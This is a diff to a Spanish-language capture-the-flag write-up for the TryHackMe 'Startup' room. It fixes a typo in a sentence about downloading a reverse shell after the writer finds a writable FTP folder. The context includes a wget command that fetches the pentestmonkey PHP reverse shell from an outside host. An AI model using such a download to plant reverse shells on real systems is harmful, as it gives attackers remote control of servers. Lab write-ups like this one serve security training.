@@ -76,7 +76,7 @@ Navegamos hasta el directorio `/file` y vemos los siguientes archivos:
 ![](/assets/images/thm-writeup-startup/files.png)
 
 Són los mismos archivos que hay en el servidor ftp, en la carpeta ftp tenemos permisos de lectura escritura y ejecución.
-No descargamos una reverse shell.
+Nos descargamos una reverse shell.
  
 ```
 wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
